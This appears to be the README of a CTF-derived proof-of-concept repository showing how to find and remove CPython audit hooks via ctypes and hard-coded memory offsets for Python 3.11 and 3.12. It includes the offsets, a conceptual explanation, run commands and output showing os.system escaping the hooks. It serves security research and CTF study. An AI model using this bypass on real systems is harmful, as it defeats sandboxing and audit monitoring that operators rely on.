# python audit_hooks head finder

This POC intends to show how to find the audit hook and use `ctypes` to pop it (~~SMASH it~~).

The idea is inspired by `misc/diligent-auditor` and `misc/IRS` challeneges and their solve scripts from [dicectf-quals-2024 CTF](https://github.com/dicegang/dicectf-quals-2024-challenges/).

# Ref
Diligent auditor from *organizers*: <https://ur4ndom.dev/posts/2024-02-11-dicectf-quals-diligent-auditor/>  
IRS writeup from *Maple Bacon*: <https://maplebacon.org/2024/02/dicectf2024-irs/>

## Tested environment
```
Python 3.12.1 (main, Feb  3 2024, 17:23:12) [GCC 13.2.1 20230801] on linux
Python 3.11.7 (main, Jan 29 2024, 16:03:57) [GCC 13.2.1 20230801] on linux
```

## Offsets
```python
# ONLY TESTED ON PYTHON 3.12 and 3.11
# the offsets are from POC.py
# offset for audit hook set by python and C
if sys.version_info[:2] == (3, 12):
    PTR_OFFSET = [0x41448, -0x11df0]
else:
    PTR_OFFSET = [0xe00, -0xe388]
```

## Smash Audit hook using `ctypes`
### Concept
For audit hook set in Python: according to the "fixed" offsets between `ctypes.byref(ctypes.py_object(()))` and `GET_INTERP_ADDR()->audit_hooks` pointer under `PyInterpreterState`, we can cast `audit_hook` to `Py_ListObject` by address and pop it.  
For audit hook set in C: according to the "fixed" offsets between `ctypes.byref(ctypes.py_object(()))` and `_PyRuntime.audit_hooks.head` pointer under `PyRuntimeState`, we can directly rewrite the head of audit hooks to `NULL`.
### How to use
```bash
# or ./build311.sh
./build.sh
./POC.py
./POC2.py
```

### Output
```bash
> ./POC.py
C audit hook triggered! event=sys.addaudithook
--- finished setup ---
PyInterpreterState_addr=0x64df082debe8
PyRuntimeState_addr=0x64df082cc180
PyInterpreterState.audit_hooks_ptr_addr=0x64df0831ffb0
PyRuntimeState.audit_hooks_ptr_addr=0x64df082ccd78

audit_hook_ptr_offset_by_py=0x41448
audit_hook_ptr_offset_by_c=-0x11df0
len=1 should be 1
C audit hook triggered! event=os.system
audit hook triggered! ('os.system', (b"echo 'test audit hook -- this will trigger hook'",))
test audit hook -- this will trigger hook
test audit hook -- this will not
> ./POC2.py
audit hook triggered! ('sys.addaudithook', ())
--- finished setup ---
C audit hook triggered! event=os.system
audit hook triggered! ('os.system', (b"echo 'test audit hook -- this will trigger hook'",))
test audit hook -- this will trigger hook
test audit hook -- this will not

```

## Smash Audit hook without `ctypes`
[UAF POC](./UAF-issue91153.md)

## TODO
- [x] Use <https://github.com/python/cpython/issues/91153> to smash it without `ctypes`
- [x] Find a way to get the `audit_hook` address without using `ctypes`
